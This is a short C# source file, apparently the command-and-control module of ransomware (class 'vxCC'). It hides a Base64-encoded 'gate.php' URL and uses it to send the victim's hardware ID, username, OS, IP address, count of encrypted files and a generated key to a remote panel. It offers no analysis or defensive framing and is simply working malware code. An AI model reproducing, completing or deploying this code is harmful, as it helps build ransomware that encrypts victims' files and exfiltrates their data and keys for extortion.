using System;
using System.Net;
using System.IO;
using System.Management;


public class vxCC
{
    private string[] Onion = new string[] { "fdsgqweewhdsfgs.co", "sadfgsdgdssdg.co" };
    private String hwid = null;
    private int EncryptedFiles = 0;
    private vxFunctions funcs = new vxFunctions();

    public vxCC(String hwid, int EncryptedFiles)
    {
        this.hwid = hwid;
        this.EncryptedFiles = EncryptedFiles;
        Init();
    }


    protected void Init()
    {
        if (MakeRequest(vxFunctions.GenKey()))
        {
            //TODO
        }
    }

    protected bool MakeRequest(String key)
    {
        try
        {
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://10.10.15.2/vxpanel/" + string.Format(funcs.Base64Decode("Z2F0ZS5waHA/aHdpZD17MH0mcGM9ezF9Jm9zPXsyfSZlbmNmaWxlcz17M30maXA9ezR9JmtleT17NX0="), hwid, Environment.UserName, vxFunctions.GetOS(), EncryptedFiles.ToString(), vxFunctions.GetIP(), key));

            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            Stream resStream = response.GetResponseStream();
        }
        catch { return false; }

        return true;
    }


    



}